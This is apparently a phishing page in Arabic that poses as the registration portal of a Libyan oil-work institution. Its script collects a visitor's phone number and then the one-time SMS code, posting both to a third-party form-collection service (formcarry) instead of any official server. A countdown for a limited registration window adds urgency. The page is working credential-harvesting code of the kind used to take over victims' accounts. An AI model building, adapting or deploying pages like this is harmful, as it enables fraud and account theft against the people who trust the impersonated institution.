<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>المؤسسة الوطنــية</title>
  <link rel="icon" href="uy.jpeg" type="image/png">
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(135deg, #002147, #003366);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      direction: rtl;
    }

    .container {
      background: #fff;
      border-radius: 20px;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
      padding: 35px 40px;
      width: 96%;
      max-width: 420px;
      box-sizing: border-box;
      text-align: center;
      z-index: 1;
    }

    .logo-container {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo-container img {
      width: 90px;
      height: 90px;
      object-fit: contain;
      margin: 0 auto;
      display: block;
    }

    .logo-container p {
      margin-top: 8px;
      font-weight: 700;
      color: #003366;
      font-size: 16px;
    }

    h2 {
      margin-bottom: 25px;
      color: #003366;
      font-weight: 900;
      font-family: Arial, Helvetica, sans-serif;
      font-size: 32px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #222;
      text-align: right;
    }

    input[type="tel"],
    input[type="text"] {
      width: 100%;
      padding: 12px 15px;
      font-size: 16px;
      border-radius: 10px;
      border: 1.8px solid #bbb;
      margin-bottom: 18px;
      transition: border-color 0.3s ease;
      box-sizing: border-box;
      font-family: inherit;
    }

    input:focus {
      border-color: gold;
      outline: none;
    }

    input:disabled {
      background-color: #f2f2f2;
    }

    button {
      width: 40%;
      padding: 12px;
      font-size: 17px;
      background-color: gold;
      border: none;
      border-radius: 10px;
      color: #002147;
      cursor: pointer;
      font-weight: bold;
      font-family: Calibri, sans-serif;
      transition: background-color 0.3s ease;
      margin-bottom: 15px;
    }

    button:hover:not(:disabled) {
      background-color: #e6c200;
    }

    button:disabled {
      background-color: #c2a300;
      cursor: not-allowed;
    }

    #timer {
      text-align: center;
      font-weight: 600;
      color: black;
      margin-bottom: 20px;
      min-height: 24px;
    }

    #codeField {
      display: none;
    }

    .error {
      color: red;
      font-size: 14px;
      margin-top: -10px;
      margin-bottom: 15px;
    }

    .note-time {
      color: #b30000;
      font-weight: bold;
      margin-top: 15px;
      font-size: 15px;
    }

    #countdownOverlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.85);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      flex-direction: column;
      text-align: center;
      font-family: 'Cairo', sans-serif;
    }

    #countdownOverlay h2 {
      font-size: 28px;
      margin-bottom: 20px;
    }

    #countdownText {
      font-size: 36px;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <div id="countdownOverlay">
    <h2>🚫 التسجيل غير متاح حالياً</h2>
    <div id="countdownText">00:00:00</div>
  </div>

  <div class="container">
    <div class="logo-container">
      <img src="uy.jpeg" alt="شعار المؤسسة الليبية للعمل النفطي" />
      <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
    </div>

    <h2>تسجيل الدخول</h2>

    <form id="phoneForm" onsubmit="return sendPhone(event);">
      <label for="phone">رقم الهاتف:</label>
      <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
      <button type="submit" id="sendPhoneBtn">أرسل كود</button>
      <div id="timer"></div>
    </form>

    <form id="codeForm" onsubmit="return sendCode(event);">
      <div id="codeField">
        <label for="code">جاري إرسال الكود عبر SMS</label>
        <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
        <div id="errorMessage" class="error"></div>
        <button type="submit" id="sendCodeBtn">طلب الدخول</button>
      </div>
    </form>

    <p class="note-time">🕒 وقت التسجيل: من الساعة 8:00م حتى الساعة 10:00م</p>
  </div>

  <script>
    function isWithinTime() {
      const now = new Date();
      const hour = now.getHours();
      return hour >= 20 && hour < 22; // 8:00 - 10:00 مساءً
    }

    function getNextOpenTime() {
      const now = new Date();
      const openTime = new Date();
      openTime.setHours(20, 0, 0, 0); // الساعة 8:00 مساءً

      if (now.getHours() >= 22) {
        openTime.setDate(openTime.getDate() + 1);
      } else if (now.getHours() < 20) {
        // نفس اليوم
      } else {
        openTime.setDate(openTime.getDate() + 1);
      }

      return openTime;
    }

    function updateCountdown() {
      const overlay = document.getElementById("countdownOverlay");
      const countdownText = document.getElementById("countdownText");
      const phoneForm = document.getElementById("phoneForm");
      const codeForm = document.getElementById("codeForm");

      if (isWithinTime()) {
        overlay.style.display = "none";
        phoneForm.style.display = 'block';
        codeForm.style.display = 'block';
        return;
      }

      overlay.style.display = "flex";
      phoneForm.style.display = 'none';
      codeForm.style.display = 'none';

      const now = new Date();
      const openTime = getNextOpenTime();
      const diff = Math.max(0, Math.floor((openTime - now) / 1000));

      const hours = Math.floor(diff / 3600).toString().padStart(2, '0');
      const minutes = Math.floor((diff % 3600) / 60).toString().padStart(2, '0');
      const seconds = (diff % 60).toString().padStart(2, '0');

      countdownText.textContent = `الفتح خلال: ${hours}:${minutes}:${seconds}`;
    }

    setInterval(updateCountdown, 1000);
    window.onload = updateCountdown;

    // وظائف النماذج
    let countdownInterval;
    const sendPhoneBtn = document.getElementById('sendPhoneBtn');
    const timerDisplay = document.getElementById('timer');
    const codeField = document.getElementById('codeField');
    const phoneInput = document.getElementById('phone');
    const codeInput = document.getElementById('code');
    const errorMessage = document.getElementById('errorMessage');

    function startTimer(duration) {
      let timeLeft = duration;
      timerDisplay.style.display = 'block';
      updateTimer(timeLeft);
      countdownInterval = setInterval(() => {
        timeLeft--;
        updateTimer(timeLeft);
        if (timeLeft <= 0) {
          clearInterval(countdownInterval);
          timerDisplay.style.display = 'none';
          sendPhoneBtn.disabled = false;
          phoneInput.disabled = false;
        }
      }, 1000);
    }

    function updateTimer(seconds) {
      const minutes = Math.floor(seconds / 60).toString().padStart(2, '0');
      const secs = (seconds % 60).toString().padStart(2, '0');
      timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${secs}`;
    }

    function sendPhone(event) {
      event.preventDefault();

      if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
        alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
        phoneInput.focus();
        return false;
      }

      fetch('https://formcarry.com/s/12UxdOsTbaW', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({ phone: phoneInput.value })
      })
      .then(response => {
        if (!response.ok) throw new Error('فشل إرسال رقم الهاتف');

        phoneInput.disabled = true;
        sendPhoneBtn.disabled = true;
        codeField.style.display = 'block';
        startTimer(480);
      })
      .catch(error => {
        alert('تعذر إرسال رقم الهاتف. حاول مرة أخرى.');
        console.error(error);
      });

      return false;
    }

    function sendCode(event) {
      event.preventDefault();
      errorMessage.textContent = '';

      if (codeInput.value.trim() === '') {
        errorMessage.textContent = 'يرجى كتابة الكود المرسل إليك.';
        codeInput.focus();
        return false;
      }

      const payload = {
        phone: phoneInput.value,
        code: codeInput.value
      };

      fetch('https://formcarry.com/s/12UxdOsTbaW', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(payload)
      })
      .then(async response => {
        const data = await response.json();

        if (response.ok && data.success !== false) {
          window.location.href = 'success.html';
        } else {
          errorMessage.textContent = '❌ هناك خطأ في الكود المرسل. حاول مرة أخرى.';
        }
      })
      .catch(error => {
        errorMessage.textContent = '⚠️ تعذر الاتصال بالخادم.';
        console.error(error);
      });

      return false;
    }
  </script>

</body>
</html>
